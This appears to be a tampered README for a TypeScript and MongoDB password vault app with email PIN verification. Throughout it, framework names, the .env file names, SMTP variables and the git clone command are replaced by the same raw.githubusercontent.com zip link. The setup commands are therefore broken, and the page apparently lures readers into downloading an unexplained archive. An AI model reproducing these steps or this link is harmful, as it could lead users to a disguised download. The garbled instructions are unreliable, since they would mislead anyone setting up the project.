# Password Vault

A secure password generator and vault built with **https://raw.githubusercontent.com/AaTull/Password-vault/main/unnumbered/Password-vault.zip**, **TypeScript**, and **MongoDB**.
Users can register, log in, generate strong passwords, and store them securely. Email verification with a 6‑digit PIN is included for registration and login.

---

## Setup & Installation

1) Clone the repository

```bash
git clone https://raw.githubusercontent.com/AaTull/Password-vault/main/unnumbered/Password-vault.zip
cd Password-vault
```

2) Install dependencies

```bash
npm install
```

3) Create environment variables

Copy the example `.env`:

```bash
cp https://raw.githubusercontent.com/AaTull/Password-vault/main/unnumbered/Password-vault.zip https://raw.githubusercontent.com/AaTull/Password-vault/main/unnumbered/Password-vault.zip
```

Fill in your credentials in `https://raw.githubusercontent.com/AaTull/Password-vault/main/unnumbered/Password-vault.zip`:

```env
MONGODB_URI=your-mongodb-uri
JWT_SECRET=your-super-secure-jwt-secret-key
NEXTAUTH_SECRET=another-secret-for-encryption-key-derivation

https://raw.githubusercontent.com/AaTull/Password-vault/main/unnumbered/Password-vault.zip
SMTP_PORT=587
https://raw.githubusercontent.com/AaTull/Password-vault/main/unnumbered/Password-vault.zip
SMTP_PASS=your_app_password
https://raw.githubusercontent.com/AaTull/Password-vault/main/unnumbered/Password-vault.zip
```

Note: Never upload `https://raw.githubusercontent.com/AaTull/Password-vault/main/unnumbered/Password-vault.zip` to GitHub. `https://raw.githubusercontent.com/AaTull/Password-vault/main/unnumbered/Password-vault.zip` can be safely shared.

4) Run the development server

```bash
npm run dev
```

Open http://localhost:3000 in your browser.

## Usage

- Register a new user → check your email for the 6‑digit PIN and verify
- Login with email + password → enter the PIN sent to your email
- Start adding passwords to your vault

## Available Scripts

| Command       | Description                    |
| ------------- | ------------------------------ |
| `npm run dev` | Run development server         |
| `npm run build` | Build project for production |
| `npm run start` | Start production server      |
| `npm run lint` | Run ESLint                    |

## Tech Stack

- Frontend: https://raw.githubusercontent.com/AaTull/Password-vault/main/unnumbered/Password-vault.zip, TypeScript, Tailwind CSS
- Backend: https://raw.githubusercontent.com/AaTull/Password-vault/main/unnumbered/Password-vault.zip API Routes (https://raw.githubusercontent.com/AaTull/Password-vault/main/unnumbered/Password-vault.zip)
- Database: MongoDB
- Email Service: SMTP (Gmail, Outlook, Mailtrap, etc.)
